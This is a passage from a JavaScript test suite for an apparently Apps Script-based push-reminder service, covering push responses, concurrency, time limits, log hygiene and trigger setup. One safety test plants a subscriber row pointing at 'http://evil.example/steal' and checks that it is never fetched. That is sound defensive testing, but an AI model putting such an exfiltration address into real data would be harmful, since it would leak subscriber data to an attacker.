      const t = boot('2026-11-08T01:30:00Z');
      assert.doesNotThrow(() => t.sandbox.remindDaily());
      assert.strictEqual(t.pushes.length, 0); assert.ok(!t.fake.props.VAPID_PRIVATE, 'no key is made when there is nobody to ping');
      await t.remind({ op: 'join', endpoint: ep(1), name: 'Ali' }); await t.remind({ op: 'leave', endpoint: ep(1) });
      const s = t.sandbox.remindDaily();
      assert.strictEqual(t.pushes.length, 0); assert.strictEqual(s.subscribers, 0); assert.strictEqual(s.sent, 0);
      assert.doesNotThrow(() => t.sandbox.remindNow());
      assert.ok(t.logs.some((l) => /remindNow: 0 reminder/.test(l)), 'remindNow says it sent 0');
      assert.strictEqual(t.pushes.length, 0);
      const c = await setup('2026-11-08T01:30:00Z');
      for (const [, i] of people) await c.remind({ op: 'leave', endpoint: ep(i) });
      c.sandbox.remindDaily(); assert.strictEqual(c.pushes.length, 0);
      say('nobody subscribed (no sheet, or an empty one): no pushes, no key made, no error');
    }

    // what the push service says back
    {
      const t = await setup('2026-11-08T01:30:00Z');
      t.push.reply = (url) => ({ [ep(2)]: 410, [ep(3)]: 404, [ep(4)]: 500, [ep(5)]: 429 })[url] || 201;
      const s = t.sandbox.remindDaily();
      const left = t.rows();
      assert.deepStrictEqual(left.map((r) => r.name), ['ali  BIN  abu', 'Dewi', 'Emma', 'Faiz'], '410 and 404 remove the subscriber');
      assert.deepStrictEqual(Object.fromEntries(left.map((r) => [r.name, r.lastResult])), { 'ali  BIN  abu': 201, Dewi: 500, Emma: 429, Faiz: 201 }, 'other answers are written down and the row stays');
      assert.ok(left.every((r) => r.lastSent === '2026-11-08T01:30:00.000Z'));
      assert.strictEqual(s.removed, 2); assert.strictEqual(s.ok, 2); assert.strictEqual(s.failed, 2); assert.strictEqual(s.sent, 6);
      assert.deepStrictEqual(await t.remind({ op: 'status', endpoint: ep(2) }), { ok: true, on: false });
      assert.deepStrictEqual(await t.remind({ op: 'status', endpoint: ep(4) }), { ok: true, on: true });
      say('answers: 410 and 404 take the subscriber off the list; 500 and 429 stay and are written down');

      // one bad subscriber never stops the rest
      const u = await setup('2026-11-08T01:30:00Z');
      u.push.reply = (url) => (url === ep(2) ? new Error('DNS error: ' + 'x'.repeat(200)) : url === ep(3) ? 301 : 201);
      let s2;
      assert.doesNotThrow(() => { s2 = u.sandbox.remindDaily(); });
      assert.strictEqual(u.pushes.length, 6, 'all six were tried');
      const rr = Object.fromEntries(u.rows().map((r) => [r.name, r.lastResult]));
      assert.ok(/^error: DNS error/.test(rr.Bala) && rr.Bala.length < 80, 'a failed send is written down, short: ' + rr.Bala);
      assert.strictEqual(rr['Chin Zhi Liang'], 301); assert.strictEqual(rr.Faiz, 201);
      assert.strictEqual(s2.failed, 2); assert.strictEqual(u.rows().length, 6, 'nobody was removed');
      say('answers: a send that throws, or odd answers, never stop the others');

      // a hand-edited row with an address we would never send to
      const v = await setup('2026-11-08T01:30:00Z');
      const sh = v.fake.sheets.get(v.fake.props.SHEET_ID).list.find((x) => x._name === 'Reminders');
      sh.rows[2][0] = 'http://evil.example/steal';
      v.sandbox.remindDaily();
      assert.strictEqual(v.pushes.length, 5, 'nothing is sent to an address that is not a push service');
      assert.ok(!v.pushes.some((p) => /evil/.test(p.url)));
      assert.strictEqual(v.rows()[1].lastResult, 'error: not a push address');
      say('safety: a row edited by hand to a non-push address is not fetched');
    }

    // while sending, people join and leave: results go to the right rows
    {
      const t = await setup('2026-11-08T01:30:00Z');
      t.push.reply = (url, n) => {
        if (n === 2) {                                                          // during the 2nd ping: Ali leaves and a newcomer joins, so every row moves up
          t.sandbox.doPost({ parameter: {}, postData: { contents: JSON.stringify({ action: 'remind', op: 'leave', endpoint: ep(1) }) } });
          t.sandbox.doPost({ parameter: {}, postData: { contents: JSON.stringify({ action: 'remind', op: 'join', endpoint: ep(9), name: 'Newcomer' }) } });
        }
        return n === 3 ? 410 : 202;
      };
      t.sandbox.remindDaily();
      const rr = t.rows();
      assert.deepStrictEqual(rr.map((r) => r.name), ['Bala', 'Dewi', 'Emma', 'Faiz', 'Newcomer'], 'Ali stays gone, Chin (410) is removed, the newcomer is added');
      assert.deepStrictEqual(rr.map((r) => r.lastResult), [202, 202, 202, 202, ''], 'every answer is on its own subscriber\'s row; the newcomer was not pinged');
      assert.strictEqual(t.locks.held, false);
      say('concurrency: a join and a leave in the middle of sending do not move the results onto the wrong rows');
    }

    // about four minutes of work, then stop
    {
      const t = boot('2026-11-08T01:30:00Z');
      for (let i = 1; i <= 10; i++) await t.remind({ op: 'join', endpoint: ep(i), name: 'Person ' + i });
      t.push.reply = () => { t.clock.now += 61000; return 201; };                // each ping "takes" 61 seconds
      const s = t.sandbox.remindDaily();
      assert.strictEqual(t.pushes.length, 4, 'stops once four minutes are used');
      assert.strictEqual(s.sent, 4); assert.strictEqual(s.notReached, 6);
      assert.deepStrictEqual(t.rows().map((r) => r.lastResult), [201, 201, 201, 201, '', '', '', '', '', ''], 'what was sent is saved, the rest is left untouched');
      assert.ok(t.logs.some((l) => /6 not reached/.test(l)));
      say('time: sending stops after four minutes and what was sent is saved');
    }

    // remindNow: everybody, any day, claimed or not
    {
      const t = await setup('2026-11-20T01:30:00Z');
      await claim(t, 'Ali bin Abu', '2026-10', true); await claim(t, 'Bala', '2026-10', true);
      assert.strictEqual(t.sandbox.remindDaily().sent, 0, 'the 20th is no reminder day');
      const s = t.sandbox.remindNow();
      assert.strictEqual(t.pushes.length, 6, 'remindNow pings all six, including the two who have claimed');
      assert.strictEqual(s.sent, 6);
      assert.ok(t.logs.some((l) => /remindNow: 6 reminder\(s\) sent to 6 on the list/.test(l)), 'it logs the count');
      assert.ok(t.rows().every((r) => r.lastResult === 201));
      t.push.reply = () => 410; t.sandbox.remindNow();
      assert.deepStrictEqual(t.rows(), [], 'it removes gone subscribers too');
      say('remindNow: ignores the day and who has claimed, pings everyone, logs the count');
    }

    // nothing secret in the log
    {
      const t = await setup('2026-11-08T01:30:00Z');
      t.sandbox.remindDaily(); t.sandbox.remindNow(); t.sandbox.setupReminders();
      const log = t.logs.join('\n');
      assert.ok(!log.includes(t.fake.props.VAPID_PRIVATE) && !log.includes(t.fake.props.VAPID_PUBLIC) && !/vapid t=/.test(log), 'no key and no token in the log');
      assert.ok(!log.includes('fcm.googleapis.com'), 'nor the push addresses');
      say('log: no key, no token, no push address');
    }
    // locks while sending: only the final save, and not twice at once
    {
      const t = await setup('2026-11-08T01:30:00Z'); await t.remind({ op: 'key' });
      const before = t.locks.taken;
      t.sandbox.remindDaily();
      assert.strictEqual(t.locks.taken - before, 1, 'one lock, at the end, so staff saving claims are never held up while it sends');
      assert.strictEqual(t.locks.held, false);
      say('locking: the sending itself takes no lock; one short lock saves the results');
    }
  }

  /* ---------- (5) the trigger ---------- */
  {
    const t = boot(), { fake } = t;
    fake.G.ScriptApp.newTrigger('remindDaily').timeBased().everyDays(7).atHour(3).inTimezone('UTC').create();          // an old one, set up differently
    fake.G.ScriptApp.newTrigger('remindDaily').timeBased().everyDays(1).atHour(9).inTimezone('Asia/Kuala_Lumpur').create();   // and a doubled one
    fake.G.ScriptApp.newTrigger('somethingElse').timeBased().everyDays(1).atHour(1).inTimezone('UTC').create();       // somebody else's trigger
    assert.strictEqual(fake.triggers.length, 3);
    t.sandbox.setupReminders();
    assert.strictEqual(fake.triggers.filter((x) => x.handler === 'remindDaily').length, 1, 'exactly one remindDaily trigger');
    assert.strictEqual(fake.triggers.filter((x) => x.handler === 'somethingElse').length, 1, 'other triggers are left alone');
    const mine = fake.triggers.find((x) => x.handler === 'remindDaily');
    assert.deepStrictEqual([mine.kind, mine.everyDays, mine.atHour, mine.timezone], ['time', 1, 9, 'Asia/Kuala_Lumpur'], 'every day at 9, Malaysia time');
    t.sandbox.setupReminders(); t.sandbox.setupReminders();
    assert.strictEqual(fake.triggers.filter((x) => x.handler === 'remindDaily').length, 1, 'running it again does not pile triggers up');
    assert.strictEqual(fake.triggers.length, 2);
    assert.ok(t.logs.some((l) => /setupReminders: replaced 1 old trigger/.test(l)), 'it says what it did: ' + t.logs.join(' | ').slice(0, 200));
    assert.ok(fake.props.VAPID_PRIVATE && fake.props.VAPID_PUBLIC, 'the sender key exists after setup');
    const clean = boot(); clean.sandbox.setupReminders();
    assert.strictEqual(clean.fake.triggers.length, 1); assert.ok(clean.logs.some((l) => /setupReminders: made one daily trigger/.test(l)));
    // what the trigger calls takes no argument it needs (Google passes an event object)
    const evt = boot('2026-11-08T01:30:00Z'); await evt.remind({ op: 'join', endpoint: ep(1), name: 'Ali' });
    assert.strictEqual(evt.sandbox.remindDaily({ 'day-of-month': 8, hour: 9, timezone: 'Asia/Kuala_Lumpur' }).sent, 1, 'the event object Google passes is ignored');
    say('setupReminders: removes the old remindDaily triggers, leaves others, makes one at 09:00 Asia/Kuala_Lumpur, safe to run again, logs what it did');
  }

  console.log('Reminder tests passed');
})().catch((e) => { console.error('FAILED:', e); process.exit(1); });
